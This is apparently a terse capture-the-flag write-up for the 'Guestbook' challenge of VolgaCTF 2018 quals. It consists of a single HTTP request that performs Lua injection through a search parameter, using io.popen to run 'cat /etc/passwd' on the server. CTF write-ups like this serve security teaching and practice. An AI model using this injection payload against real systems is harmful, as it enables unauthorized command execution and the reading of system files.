# Guestbook Writeup

Lua Injection

```
GET /search?search="..(io.popen('cat\x20/etc/passwd','r'):read('*a')).." HTTP/1.1
Host: guestbook.quals.2018.volgactf.ru
```